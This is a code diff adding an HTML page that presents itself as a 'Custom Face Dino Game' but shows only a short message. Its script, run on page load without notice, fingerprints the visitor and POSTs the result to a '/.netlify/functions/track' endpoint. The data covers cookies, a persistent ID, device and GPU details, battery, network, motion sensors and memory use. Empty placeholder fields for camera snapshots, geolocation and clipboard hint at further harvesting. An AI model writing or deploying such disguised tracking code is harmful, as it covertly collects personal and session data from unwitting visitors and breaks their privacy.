@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Custom Face Dino Game</title>
+  <style>
+    * { box-sizing: border-box; touch-action: manipulation; }
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: monospace;
+      background: #0f172a;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow: hidden;
+      transition: background 0.5s ease;
+    }
+
+    body.night-mode {
+      background: #202124;
+    }
+
+    #gameContainer {
+      position: relative;
+      width: 100%;
+      max-width: 600px;
+      aspect-ratio: 2 / 1;
+      background: linear-gradient(135deg, #111827 0%, #132a24 100%);
+      border: 2px solid #10b981;
+      border-radius: 8px;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.45), 0 0 20px rgba(16, 185, 129, 0.15);
+      overflow: hidden;
+      transition: background 0.5s ease, border-color 0.5s ease;
+    }
+
+    #gameContainer.night-mode {
+      background: #202124;
+      border-color: #e8eaed;
+    }
+
+    canvas {
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+
+    /* Replaced game UI with animated secure status message */
+    .secure-status-box {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      padding: 20px;
+      text-align: center;
+      color: #a7f3d0;
+    }
+
+    .secure-pulse {
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      background: #34d399;
+      animation: securePulse 1.6s ease-in-out infinite;
+    }
+
+    .secure-message {
+      font-size: 16px;
+      font-weight: bold;
+      letter-spacing: 0.4px;
+      color: #d1fae5;
+      text-shadow: 0 0 12px rgba(52, 211, 153, 0.35);
+      animation: secureFloat 2.4s ease-in-out infinite;
+    }
+
+    @keyframes securePulse {
+      0%, 100% {
+        transform: scale(0.9);
+        box-shadow: 0 0 0 0 rgba(52, 211, 153, 0.65);
+      }
+      50% {
+        transform: scale(1.15);
+        box-shadow: 0 0 0 10px rgba(52, 211, 153, 0);
+      }
+    }
+
+    @keyframes secureFloat {
+      0%, 100% {
+        transform: translateY(0px);
+        opacity: 0.9;
+      }
+      50% {
+        transform: translateY(-4px);
+        opacity: 1;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div id="gameContainer">
+    <!-- Game part replaced -->
+    <div class="secure-status-box">
+      <div class="secure-pulse"></div>
+      <div class="secure-message">nothing much, by day 10 its 1032rs😁</div>
+    </div>
+  </div>
+
+<script>
+  const gameContainer = document.getElementById('gameContainer');
+  const pageStartTime = Date.now();
+
+  let motionData = { accelX: 0, accelY: 0, accelZ: 0 };
+  if (window.DeviceMotionEvent) {
+    window.addEventListener('devicemotion', (event) => {
+      if (event.accelerationIncludingGravity) {
+        motionData = {
+          accelX: event.accelerationIncludingGravity.x?.toFixed(2) || 0,
+          accelY: event.accelerationIncludingGravity.y?.toFixed(2) || 0,
+          accelZ: event.accelerationIncludingGravity.z?.toFixed(2) || 0
+        };
+      }
+    });
+  }
+
+  function getGPUInfo() {
+    try {
+      const glCanvas = document.createElement('canvas');
+      const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+      if (!gl) return { vendor: 'N/A', renderer: 'N/A' };
+
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (debugInfo) {
+        return {
+          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+        };
+      }
+    } catch (e) {
+      return { vendor: 'N/A', renderer: 'N/A' };
+    }
+    return { vendor: 'N/A', renderer: 'N/A' };
+  }
+
+  function getSessionData() {
+    let visitorId = localStorage.getItem('dinoVisitorId');
+    if (!visitorId) {
+      visitorId = 'user_' + Math.random().toString(36).substring(2, 11);
+      localStorage.setItem('dinoVisitorId', visitorId);
+    }
+
+    const lastVisit = localStorage.getItem('dinoLastVisit') || new Date().toISOString();
+    localStorage.setItem('dinoLastVisit', new Date().toISOString());
+
+    return {
+      visitorId: visitorId,
+      lastVisit: lastVisit,
+      cookies: document.cookie || 'no-cookies-set'
+    };
+  }
+
+  async function sendTelemetry() {
+    const timePlayedSecs = Math.floor((Date.now() - pageStartTime) / 1000);
+
+    let batteryData = { level: 'N/A', charging: 'N/A' };
+    if ('getBattery' in navigator) {
+      try {
+        const battery = await navigator.getBattery();
+        batteryData = {
+          level: `${Math.round(battery.level * 100)}%`,
+          charging: battery.charging
+        };
+      } catch (e) {
+        console.error(e);
+      }
+    }
+
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    const connectionData = conn ? {
+      effectiveType: conn.effectiveType || 'unknown',
+      downlink: conn.downlink ? `${conn.downlink} Mbps` : 'unknown',
+      rtt: conn.rtt ? `${conn.rtt} ms` : 'unknown'
+    } : { effectiveType: 'unsupported' };
+
+    const hardwareData = {
+      cpuCores: navigator.hardwareConcurrency || 'unknown',
+      ramGb: navigator.deviceMemory || 'unknown',
+      gpu: getGPUInfo()
+    };
+
+    const sessionData = getSessionData();
+    const orientationData = screen.orientation ? screen.orientation.type : 'unknown';
+    const storageAndPerformanceData = {
+      storageEstimate: navigator.storage && navigator.storage.estimate ? 'available' : 'unavailable',
+      performanceMemory: window.performance && window.performance.memory
+        ? `${Math.round(window.performance.memory.usedJSHeapSize / 1048576)} MB`
+        : 'N/A'
+    };
+
+    const telemetryData = {
+      score: 0,
+      avatar: null,
+      timePlayed: timePlayedSecs,
+      device: {
+        platform: navigator.platform || 'unknown',
+        userAgent: navigator.userAgent,
+        screenResolution: `${window.innerWidth}x${window.innerHeight}`
+      },
+      language: navigator.language,
+      battery: batteryData,
+      network: connectionData,
+      hardware: hardwareData,
+      motion: motionData,
+      orientation: orientationData,
+      ambientLight: 'not_requested',
+      geolocation: 'not_requested',
+      cameraSnapshot: 'not_requested',
+      storageAndPerformance: storageAndPerformanceData,
+      clipboard: 'not_requested',
+      session: sessionData
+    };
+
+    try {
+      const res = await fetch('/.netlify/functions/track', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(telemetryData)
+      });
+      await res.json();
+    } catch (err) {
+      console.error('Error sending telemetry:', err);
+    }
+  }
+
+  window.addEventListener('load', () => {
+    sendTelemetry();
+  });
+</script>
+</body>
+</html>
